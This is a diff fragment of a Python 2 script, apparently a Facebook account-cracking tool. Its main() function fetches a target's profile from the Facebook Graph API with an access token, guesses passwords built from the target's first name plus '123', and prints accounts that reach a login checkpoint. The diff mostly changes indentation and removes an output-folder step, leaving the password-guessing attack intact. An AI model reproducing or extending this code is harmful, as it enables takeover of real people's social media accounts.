@@ -312,14 +312,9 @@ def pilih_super():
 	print 42*"\033[1;96m="
 	
 			
-	def main(arg):
-		global cekpoint,oks
-		user = arg
-		try:
-			os.mkdir('out')
-		except OSError:
-			pass
-		try:
+    def main(arg):
+        user = arg
+        try:
             a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
             b = json.loads(a.text)
             pass1 = b['first_name'] + '123'
@@ -550,8 +545,7 @@ def pilih_super():
                                                                                                                                                            else:
                                                                                                                                                                 if 'www.facebook.com' in q['error_msg']:
                                                                                                                                                                      print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;97m] ' + user +' | ' + pass21 +'==>' + b['name'] 
-                                                                                                                                                                     print 55 * '\x1b[1;97m\xe2\x95\x90'
-
+                     
 		except:
 			pass
 		
